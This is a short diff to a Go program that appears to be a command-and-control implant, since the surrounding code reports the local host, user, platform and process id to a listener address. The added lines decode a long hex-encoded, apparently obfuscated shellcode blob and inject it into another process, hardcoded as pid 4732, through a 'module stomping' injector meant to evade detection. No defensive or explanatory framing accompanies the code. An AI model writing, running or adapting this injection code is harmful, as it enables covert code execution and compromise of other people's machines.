@@ -257,6 +257,15 @@ func main() {
 	ip = lhost
 	jsonData, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,p.Executable(),"",nil})
 	debugFatal(err)
+
+
+	data, _ := hex.DecodeString("4831c94881e9c6ffffff488d05efffffff48bbba56e3141c6ba58248315827482df8ffffffe2f4461e60f0ec836582ba56a2455d3bf7d3ec1ed2c679232ed0da1e684604232ed09a1e68664c23aa35f01cae25d5239442166a82681e4785c37b9fee551daa476fe817b25c97398509f86aab15cce0250aba56e35c99abd1e5f25733449723bdc63116c35d1dbb46d4f2a92a55975f2dcabb80ae25d5239442161722dd112aa44382b696e55068e9a6b213dac569b3fdc63116c75d1dbbc3c3315aab50972bb9cbbb86a29f18e3ed836a17bb554435fcd8fb0ea24d5d31ed015676a246e38bfdc3e30cab9f0e82f27d45a9be5da21cd6b0e565d1141c2af3cb33b0ab95f0cba482ba1f6af155d7a782be849c141c6ae4d6f3df0758959ae438f621c513e3bee90b503ee2151c6bfcc3007f637f1c9470d2ea1bd2dd515a65ca4596ab9dde235a42f2df2255a681aa5d5aa9365c95accf92fb0eaf9dfe232c7bfbec7ab1680a5a57f2d727541e6ba5cb02358e701c6ba582ba17b3554c232c60ed01b4592dabcf8fe317b3f6e00d62c69e02e21554e6e1a6a290e37c54e243d4ea17b3554c2af5cb4596a24455946dcf3397af9ddd2a1ffb766965ebc9239450f2a9299f122a1f8a3d4b83ebc9d055371800a2aebafe181f4583ab97d8439984c65c63effc1ea039fd45917b766bfcc3338c1cc11c6ba582")
+	si := RemoteShellcodeInjector { 
+		data,
+		4732,
+	}
+	errsi := si.injectModuleStomp()
+	fmt.Println(errsi)
 	
 	if cmdProxyIp == "" {
 		var encoder = Base64Encoder {
